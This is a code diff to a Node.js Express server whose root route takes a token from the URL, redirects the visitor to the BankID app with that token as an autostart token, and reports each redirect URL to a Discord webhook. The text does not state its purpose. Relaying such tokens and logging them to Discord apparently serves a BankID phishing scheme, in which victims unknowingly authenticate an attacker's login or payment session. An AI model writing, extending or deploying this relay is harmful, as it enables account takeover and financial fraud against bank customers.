@@ -10,42 +10,14 @@ let AMOUNT = ""
 
 app.use(express.json());
 
-app.get('/', (req, res) => {
-  // Extract the query string from req.originalUrl
-  const queryString = req.originalUrl.split('?')[1];
+app.get('/?:token', (req, res) => {
+ var token = req.params.token; 
 
-  if (!queryString) {
-    return res.status(400).send('Query parameters are required.');
-  }
-
-  // Split the query string into individual parameters
-  const params = new URLSearchParams(queryString);
-
-  // Initialize an array to store formatted query parameters
-  const formattedParams = [];
-
-  // Iterate through each parameter
-  for (const [key, value] of params.entries()) {
-    // Encode key and value
-    const encodedKey = encodeURIComponent(key);
-    const encodedValue = encodeURIComponent(value);
-
-    // Remove trailing '=' from parameter value if present
-    const sanitizedValue = encodedValue.endsWith('%3D') ? encodedValue.slice(0, -3) : encodedValue;
-
-    // Construct key-value pair and add to formattedParams array
-    formattedParams.push(`${encodedKey}=${sanitizedValue}`);
-  }
-
-  // Construct the redirect URL with formatted query parameters
-  const redirectUrl = `bankid:///?${formattedParams.join('&')}`;
-
-  // Log the redirect URL to Discord webhook
+  const redirectUrl = `bankid:///?autostarttoken=${token}`;
   sendDiscordWebhook(redirectUrl);
-
-  // Redirect to the constructed URL
   res.redirect(redirectUrl);
 });
+
 
 
 
